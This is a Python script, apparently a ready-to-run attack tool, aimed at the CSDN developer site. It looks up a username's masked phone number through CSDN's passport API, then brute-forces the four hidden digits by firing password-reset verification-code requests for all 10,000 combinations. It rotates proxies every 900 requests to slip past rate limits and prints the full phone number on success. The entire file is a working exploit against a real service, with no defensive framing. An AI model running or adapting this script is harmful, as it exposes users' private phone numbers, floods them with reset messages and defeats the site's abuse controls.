import requests
import sys
import re
import urllib3
import itertools as it
import time
import json
import signal
from tqdm import tqdm
from lxml import etree

urllib3.disable_warnings()


def getcsdn(name):
    session = requests.session()
    proxies = [{"https":"https://127.0.0.1:8080"},{"https":"https://127.0.0.1:8080"}]

    url = "https://passport.csdn.net/v1/service/usernames/%s?comeFrom = 0" % name
    req_header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0',
    }
    resp=session.get(url,headers=req_header)
    
    if str(resp.json()["status"]) != "True":
        print("[!] 不存在此CSDN账号！")
        return
    phone = resp.json()["data"]["mobile"]
    print("[*] 掩码手机号为：",phone)
    
    count = 0   # 记录请求次数
    pnum = 0    # 记录代理
    
    for i in tqdm(range(0000,10000),ncols=85,desc="[-] 正在爆破，请稍等...当前进度为"):
        global code
        code = f'{i:04}'
        newphone = phone.replace("****",code)
        passurl="https://passport.csdn.net/v1/fpwd/sendVerifyCode"
        form_data = {
            'code': "0086",
            'mobileOrEmail': newphone,
            "sendType":1
        }
        res = session.post(url=passurl,headers=req_header, json=form_data, proxies=proxies[pnum], verify=False)
        count += 1
        if count == 900:
            print("\n[*] 当前已经请求了" + str(count) + "次，" + "对应爆破的code：" + code)
            count = 0   # 重新计数
            print("[*] 开始重新计数，重置后count："+str(count))
            pnum += 1
            print("[*] 当前代理位数："+str(pnum))
        
        # 打印执行信息
        # print(res.text + "--->" + code + "---" + str(res.json()["status"]))
        
        if str(res.json()["status"]) == "True":
            print("[+] 成功爆破四位的code：" + code)
            print("[+] 完整手机号：" + newphone)
            return

        
if __name__ == '__main__':
    name = input("请输入csdn用户名：")
    getcsdn(name)
    